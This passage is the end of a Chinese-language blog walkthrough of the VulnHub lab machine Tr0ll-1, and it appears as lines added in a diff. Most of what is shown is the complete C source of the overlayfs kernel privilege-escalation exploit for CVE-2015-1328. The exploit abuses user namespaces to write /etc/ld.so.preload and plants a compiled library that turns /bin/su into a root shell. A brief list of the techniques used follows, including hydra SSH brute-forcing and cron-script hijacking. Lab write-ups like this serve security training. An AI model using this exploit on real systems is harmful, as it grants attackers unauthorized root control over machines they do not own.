class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><span class="line"></span><br><span class="line">static char child_stack[1024*1024];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, 0777);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, 0777);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>,0777);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>,0777);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,<span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != 0) &#123;</span><br><span class="line">// workdir= and <span class="string">&quot;overlay&quot;</span> is needed on newer kernels, also can<span class="string">&#x27;t use /proc as lower</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;);</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        file = &quot;.access&quot;;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125; else file = &quot;ns_last_pid&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    rename(file,&quot;ld.so.preload&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/&quot;);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;mount #2\n&quot;);</span></span><br><span class="line"><span class="string">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int</span></span><br><span class="line"><span class="string">main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int status, fd, lib;</span></span><br><span class="line"><span class="string">    pid_t wrapper, init;</span></span><br><span class="line"><span class="string">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;spawning threads\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if((wrapper = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">        if(unshare(CLONE_NEWUSER) != 0)</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;failed to create new user namespace\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if((init = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">            pid_t pid =</span></span><br><span class="line"><span class="string">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span></span><br><span class="line"><span class="string">            if(pid &lt; 0) &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;failed to create new mount namespace\n&quot;);</span></span><br><span class="line"><span class="string">                exit(-1);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        waitpid(init, &amp;status, 0);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    usleep(300000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    wait(NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;child threads done\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(fd == -1) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;exploit failed\n&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;creating shared library\n&quot;);</span></span><br><span class="line"><span class="string">    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);</span></span><br><span class="line"><span class="string">    write(lib,LIB,strlen(LIB));</span></span><br><span class="line"><span class="string">    close(lib);</span></span><br><span class="line"><span class="string">    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);</span></span><br><span class="line"><span class="string">    if(lib != 0) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;couldn&#x27;</span>t create dynamic library\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    write(fd,&quot;</span>/tmp/ofs-lib.so\n<span class="string">&quot;,16);</span></span><br><span class="line"><span class="string">    close(fd);</span></span><br><span class="line"><span class="string">    system(&quot;</span><span class="built_in">rm</span> -rf /tmp/ns_sploit /tmp/ofs-lib.c<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    execl(&quot;</span>/bin/su<span class="string">&quot;,&quot;</span>su<span class="string">&quot;,NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>过程太简单在这里就不多写文演示了</p>
+<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
+<li>ftp匿名登录</li>
+<li>hydra爆破ssh密码</li>
+<li>cron job + world writeable py脚本提权</li>
+<li>CVE-2015-1328 linux内核提权</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/03/31/Tr0ll-1/" title="vulnhub靶机渗透[Tr0ll-1]">https://fdlucifer.github.io/2020/03/31/Tr0ll-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/03/30/SickOs-1-2/" rel="prev" title="vulnhub靶机渗透[SickOs-1-2]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[SickOs-1-2]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/01/Tr0ll-2/" rel="next" title="vulnhub靶机渗透[Tr0ll-2]">
+                  vulnhub靶机渗透[Tr0ll-2] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
